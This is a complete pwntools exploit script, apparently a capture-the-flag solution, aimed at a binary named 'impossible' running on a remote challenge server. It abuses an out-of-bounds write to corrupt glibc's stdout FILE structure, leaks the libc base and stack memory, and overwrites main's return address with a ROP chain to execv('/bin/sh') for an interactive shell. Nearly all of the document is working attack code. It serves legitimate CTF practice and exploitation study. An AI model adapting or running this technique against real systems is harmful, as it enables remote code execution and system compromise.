#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import copy
from ctypes import *
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./impossible')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '35.205.206.137'
port = int(args.PORT or 12345)

# Execute the target binary locally
def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Connect to the process on the remote host
def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

start = remote if args.REMOTE else local
libc = ELF("./libc-2.26.so") if args.REMOTE else exe.libc

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
io = start()

# solve the proof of work
if args.REMOTE:
    challenge = io.recvline_contains("please give S")
    bits = int(re.search(r'\b([0-9]+) zero bits', challenge).group(1))
    prefix = re.search(r'"(.*)"', challenge).group(1)
    with log.progress("solving proof of work") as p:
        p.status("bits %d prefix %s", bits, prefix)
        r = subprocess.check_output(["./pow-solver", str(bits), prefix]).strip()
        p.success("bits %d prefix %s solution %s", bits, prefix, r)
    io.sendline(r)

# write data to `heap_block + offset`
def write_rel(offset, data):
    offset = c_uint64(offset).value
    for i, b in enumerate(data):
        io.sendline("{:x} {:x}".format(offset + i, ord(b)))

# use large enough size to get an mmaped chunk
size = 0x400000

# only allocate size-0x1000 to allow for heap metadata
# the mmap'ed area will be `size` bytes large
io.sendline("%x" % (size - 0x1000))

# set the *relative* address of libc compared to our mmapped chunk
# (-0x10 for the malloc chunk header)
libc_rel = copy.copy(libc)
libc_rel.address = size - 0x10

# this function will trigger a flush of stdout and return the written data
def flush_stdout():
    # set flags on stdout:
    #   0x200 _IO_LINE_BUF: to enable the "flush on read from stdin"
    #   0x800 _IO_CURRENTLY_PUTTING:
    #     setting this makes flushing directly write the buffer to stdout with no other checks
    write_rel(libc_rel.symbols._IO_2_1_stdout_ + 1, p8(0x20 | 0x8 | 0x2))

    # put stdin in unbuffered mode
    # this should enable the flushing
    write_rel(libc_rel.symbols._IO_2_1_stdin_, p8(0x88 | 0x2))

    # the scanf call in main will now trigger a flush before reading, collect the data
    data = io.clean(timeout=2)

    # disable stdin unbuffered flag again
    # sometimes, we need more than one `write` call to setup everything before we want to flush
    # if we didn't disable the flag here, each of those writes would cause a flush and we don't want that
    # (we only want to trigger the flush at the end)
    write_rel(libc_rel.symbols._IO_2_1_stdin_, p8(0x88))
    return data

# set unbuffered flag on stdout, necessary to get the buffer to point to _shortbuf (required for the libc leak)
write_rel(libc_rel.symbols._IO_2_1_stdout_, p8(0x84 | 0x2))

# this is the first write to stdout in the program (so the stdout buffer was NULL before)
# the write will trigger allocation of the buffer for stdout, and because the unbuffered flag is set,
# that buffer will point to _shortbuf
flush_stdout()

# move back the stdout buffer to point before the _shortbuf
# if _IO_read_end != _IO_write_base, glibc will try to use seek and fail which we want to avoid
# (that's why we overwrite _IO_read_end as well and not just _IO_write_base)
write_rel(libc_rel.symbols._IO_2_1_stdout_ + 0x10, p8(0x00)) # overwrites _IO_read_end
write_rel(libc_rel.symbols._IO_2_1_stdout_ + 0x20, p8(0x00)) # overwrites _IO_write_base

# we have leaked the libc base
data = flush_stdout()
info("leaked address: %#x", u64(data[8:][:8]))
libc.address += u64(data[8:][:8]) - libc.symbols._IO_2_1_stdin_
alloc_base = libc.address - size # address of our mmaped heap block
success("libc base: %#x, alloc_base: %#x", libc.address, alloc_base)

# now that we have the absolute address of the heap block, we are able to write to absolute addresses
# by computing the offset
def write_abs(address, data):
    offset = address - (alloc_base + 0x10) # +0x10 to account for the malloc chunk header
    write_rel(offset, data)

# we can also leak arbitrary addresses
@MemLeak
def leak(addr):
    # setup stdio's buffer pointers
    write_abs(libc.symbols._IO_2_1_stdout_ + 0x10, p64(addr)) # _IO_read_end
    write_abs(libc.symbols._IO_2_1_stdout_ + 0x20, p64(addr)) # _IO_write_base
    write_abs(libc.symbols._IO_2_1_stdout_ + 0x28, p64(addr + 0x2000)) # _IO_write_ptr

    # flush it to leak
    return flush_stdout()

stack_ptr = leak.u64(libc.symbols.program_invocation_name)
info("stack ptr: %#x" % stack_ptr)

# this is the address that main normally returns to (some instruction in __libc_start_main)
main_ret = libc.symbols.__libc_start_main + 234

# stack_ptr is an address above main's stack frame, so leak some stack data
# to find main's return address
base = stack_ptr - 0x2000
stack = leak.n(base, 0x2000)
ret_location = base + stack.find(p64(main_ret))
success("found main return address: %#x", ret_location)

# let's build a small ROP to return to execv and overwrite main's return address with it
rop = ROP(libc)
rop.call("execv", [next(libc.search("/bin/sh\0")), 0])
write_abs(ret_location, rop.chain())

# make scanf fail so main returns
io.sendline("x")

# enjoy shell
io.interactive()
